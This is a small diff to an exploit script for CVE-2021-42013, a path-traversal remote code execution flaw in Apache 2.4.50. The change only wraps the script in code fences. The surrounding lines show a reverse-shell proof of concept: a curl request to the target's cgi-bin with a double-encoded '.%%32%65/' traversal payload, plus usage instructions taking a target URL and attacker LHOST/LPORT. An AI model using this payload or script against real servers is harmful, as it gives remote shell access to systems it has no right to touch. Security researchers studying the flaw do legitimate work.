@@ -7,6 +7,8 @@
 # Tested on : Debian 5.10.28
 # CVE : CVE-2021-42013
 
+```
+
 #!/bin/bash
 
 echo 'PoC CVE-2021-42013 reverse shell Apache 2.4.50 with CGI'
@@ -20,3 +22,4 @@ curl "$1/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/
 #usage chmod -x CVE-2021-42013.sh
 #./CVE-2021-42013_reverseshell.sh http://ip:port/ LHOST LPORT
             
+```
